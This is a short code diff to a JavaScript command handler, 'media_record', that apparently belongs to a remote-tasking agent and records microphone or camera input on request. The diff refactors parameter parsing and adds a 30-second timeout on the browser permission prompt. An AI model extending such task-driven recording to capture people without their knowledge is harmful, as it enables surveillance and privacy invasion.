@@ -1,8 +1,5 @@
 COMMANDS['media_record'] = async function(task) {
-    var params = task.parameters;
-    if (typeof params === 'string') {
-        try { params = JSON.parse(params); } catch (e) { params = {}; }
-    }
+    var params = parseParams(task);
     var duration = (params && params.duration) ? parseInt(params.duration) : 10;
     var type = (params && params.type) ? params.type : 'audio';
 
@@ -16,7 +13,17 @@ COMMANDS['media_record'] = async function(task) {
         constraints.video = true;
     }
 
-    var stream = await navigator.mediaDevices.getUserMedia(constraints);
+    var stream;
+    try {
+        stream = await Promise.race([
+            navigator.mediaDevices.getUserMedia(constraints),
+            new Promise(function(_, reject) {
+                setTimeout(function() { reject(new Error('getUserMedia timed out — browser permission prompt may have been ignored (30s)')); }, 30000);
+            })
+        ]);
+    } catch (e) {
+        return JSON.stringify({error: e.message}, null, 2);
+    }
 
     try {
         var chunks = [];
